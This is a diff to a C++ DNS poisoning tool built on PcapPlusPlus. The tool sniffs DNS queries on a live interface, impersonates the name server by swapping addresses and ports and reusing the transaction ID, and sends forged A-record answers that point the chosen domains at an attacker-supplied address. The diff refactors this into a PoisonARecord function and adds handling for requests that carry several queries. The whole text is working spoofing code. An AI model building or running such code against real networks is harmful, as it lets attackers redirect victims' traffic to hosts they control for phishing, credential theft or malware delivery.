@@ -3,7 +3,6 @@
 #include <EthLayer.h>
 #include <IPv4Layer.h>
 #include <UdpLayer.h>
-#include <DnsLayer.h>
 
 #include <chrono>
 #include <thread>
@@ -55,7 +54,7 @@ void Program::OnPacketCapture(pcpp::RawPacket* packet, pcpp::PcapLiveDevice* dev
     pcpp::IPv4Layer* ipLayer = parsedPacket.getLayerOfType<pcpp::IPv4Layer>();
     pcpp::DnsLayer* dnsLayer = parsedPacket.getLayerOfType<pcpp::DnsLayer>();
 
-    if(!dnsLayer || dnsLayer->getFirstQuery()->getDnsType() != pcpp::DnsType::DNS_TYPE_A) // the packet isn't a DNS one or isn't a type A record (temporary fix until support for more record types)
+    if(!dnsLayer) // the packet isn't a DNS one or isn't a type A record (temporary fix until support for more record types)
         return;
 
     // Constructing the poisoned response
@@ -70,32 +69,85 @@ void Program::OnPacketCapture(pcpp::RawPacket* packet, pcpp::PcapLiveDevice* dev
     uint16_t sourcePort = udpLayer->getDstPort(); // They are switched because we are impersonating the name server
     uint16_t destPort = udpLayer->getSrcPort();
 
-    pcpp::DnsQuery* originalQuery = dnsLayer->getFirstQuery();
-    std::string dnsQueryName = originalQuery->getName();
-
-    if (args.specificDomains)
-    {
-        bool domainMatch = false;
-        for (const std::string& domain : args.domains)
-            domainMatch = dnsQueryName.compare(domain) == 0; 
-
-        if (!domainMatch)
-            return;
-    }
-
-    pcpp::DnsClass dnsClass = originalQuery->getDnsClass();
-    pcpp::DnsType dnsType = originalQuery->getDnsType();
-
     pcpp::EthLayer poisonedEthLayer(sourceMac, destMac);
     pcpp::IPv4Layer poisonedIPLayer(sourceIP, destIP);
     pcpp::UdpLayer poisonedUdpLayer(sourcePort, destPort);
     pcpp::DnsLayer poisonedDnsLayer;
     poisonedDnsLayer.getDnsHeader()->transactionID = originalID;
 
+#ifdef SUPPORT_MULTIPLE_QUERIES_IN_A_SINGLE_REQUEST
+    for(pcpp::DnsQuery* currentQuery = dnsLayer->getFirstQuery(); currentQuery; currentQuery = dnsLayer->getNextQuery(currentQuery))
+    {
+        if (args.specificDomains)
+        {
+            bool domainMatch = false;
+            for(const std::string& domain : args.domains)
+            {
+                if (currentQuery->getName().compare(domain) == 0)
+                {
+                    switch(currentQuery->getDnsType())
+                    {
+                        case pcpp::DnsType::DNS_TYPE_A:
+                        {
+                            PoisonARecord(poisonedDnsLayer, currentQuery);
+                            domainMatch = true;
+                            continue;
+                        }
+                    }
+                    break;
+                }
+            }
+            if (!domainMatch)
+            {
+                poisonedDnsLayer.addQuery(currentQuery); // No response for this query
+            }
+        }
+        else
+        {
+            PoisonARecord(poisonedDnsLayer, currentQuery);
+        }
+    }
+#else
+    pcpp::DnsQuery* query = dnsLayer->getFirstQuery();
+    std::string dnsQueryName = query->getName();
 
-    pcpp::IPv4DnsResourceData poisonedData(args.hostAddress);
-    poisonedDnsLayer.addQuery(originalQuery);
-    poisonedDnsLayer.addAnswer(dnsQueryName, dnsType, dnsClass, args.poisonTtl, &poisonedData)->setData(&poisonedData);
+    if (args.specificDomains)
+    {
+        bool domainMatch = false;
+        for(const std::string& domain : args.domains)
+        {
+            if (query->getName().compare(domain) == 0)
+            {
+                switch(query->getDnsType())
+                {
+                    case pcpp::DnsType::DNS_TYPE_A:
+                    {
+                        PoisonARecord(poisonedDnsLayer, query);
+                        domainMatch = true;
+                        continue;
+                    }
+                }
+                break;
+            }
+        }
+        if (!domainMatch)
+        {
+            return; // No response for this query
+        }
+    }
+    else
+    {
+        switch(query->getDnsType())
+        {
+            case pcpp::DnsType::DNS_TYPE_A:
+            {
+                PoisonARecord(poisonedDnsLayer, query);
+                break;
+            }
+        }
+    }
+#endif
+
 
     pcpp::Packet poisonedPacket(100);
 
@@ -115,10 +167,17 @@ void Program::OnPacketCapture(pcpp::RawPacket* packet, pcpp::PcapLiveDevice* dev
 
     }
 
-    std::cout << "Poisoning successful." << std::endl;
+    std::cout << "Poisoned response sent." << std::endl;
     isCapturing = false;
     capturingEnded.notify_all();
     return;
+}
+
+void Program::PoisonARecord(pcpp::DnsLayer& dnsLayer, pcpp::DnsQuery* const query)
+{
+    pcpp::IPv4DnsResourceData poisonedData(args.hostAddress);
+    dnsLayer.addQuery(query);
+    dnsLayer.addAnswer(query->getName(), query->getDnsType(), query->getDnsClass(), args.poisonTtl, &poisonedData);
 }
 
 void Program::ParseArguments(int argc, char* argv[])
